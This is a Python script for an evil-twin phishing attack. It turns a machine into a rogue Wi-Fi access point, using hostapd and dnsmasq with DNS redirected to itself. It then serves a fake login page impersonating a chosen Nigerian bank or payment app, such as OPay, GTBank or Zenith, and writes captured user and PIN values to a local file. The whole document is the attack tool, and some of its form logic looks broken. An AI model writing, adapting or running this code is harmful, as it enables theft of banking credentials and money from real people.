#!/usr/bin/env python3
import http.server, socketserver, os, subprocess, threading, json, sys
from urllib.parse import urlparse, parse_qs

BANKS = {
    "1": {"name": "OPay", "url": "https://opayweb.com", "logo": "https://opayweb.com/favicon.ico"},
    "2": {"name": "Palmpay", "url": "https://palmpay.com", "logo": "https://palmpay.com/favicon.ico"},
    "3": {"name": "Moniepoint", "url": "https://moniepoint.com", "logo": ""},
    "4": {"name": "GTBank", "url": "https://gtbank.com", "logo": ""},
    "5": {"name": "Zenith", "url": "https://zenithbank.com", "logo": ""},
    "6": {"name": "FirstBank", "url": "https://firstbanknigeria.com", "logo": ""}
}

captured = []
selected_bank = None

def start_ap():
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=False)
    subprocess.run(["sudo", "dnsmasq", "--interface=wlan0", "--dhcp-range=10.0.0.2,10.0.0.20,12h", "--dhcp-option=3,10.0.0.1", "--dhcp-option=6,10.0.0.1", "--bind-dns", "--address=/#/10.0.0.1"], check=False)
    subprocess.run(["sudo", "hostapd", "-B", "/etc/hostapd.conf"], check=False)

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        p = urlparse(self.path).path
        if p == "/creds":
            qs = parse_qs(urlparse(self.path).query)
            cred = {"user": qs.get("user",[""])[0], "pin": qs.get("pin",[""])[0]}
            captured.append(cred)
            open("/tmp/phished.json","w").write(json.dumps(captured))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"<html><body><h1>Login {selected_bank['name']}</h1><form action=/creds?user={selected_bank['name']}&pin=1234>Enter PIN:<input name=pin><button>Go</button></form></body></html>".encode())

if __name__ == "__main__":
    print("Banks:", {k:v['name'] for k,v in BANKS.items()})
    sel = input("Choose bank ID: ")
    if sel not in BANKS: sys.exit("Bad ID")
    selected_bank = BANKS[sel]
    print(f"Phishing {selected_bank['name']}...")
    start_ap()
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("0.0.0.0", 80), PhishHandler)
    httpd.serve_forever()